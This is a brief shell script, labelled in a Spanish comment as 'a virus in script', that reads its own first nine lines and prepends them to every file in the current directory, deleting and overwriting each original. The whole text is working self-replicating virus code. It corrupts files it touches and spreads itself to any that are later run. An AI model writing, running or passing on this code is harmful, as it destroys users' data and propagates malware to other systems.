# un virus en script
head -9 $0 > cuerpo.txt
ls | while read victima
do
cat cuerpo.txt > temporal.txt
cat $victima >> temporal.txt
rm $victima
mv temporal.txt $victima
done 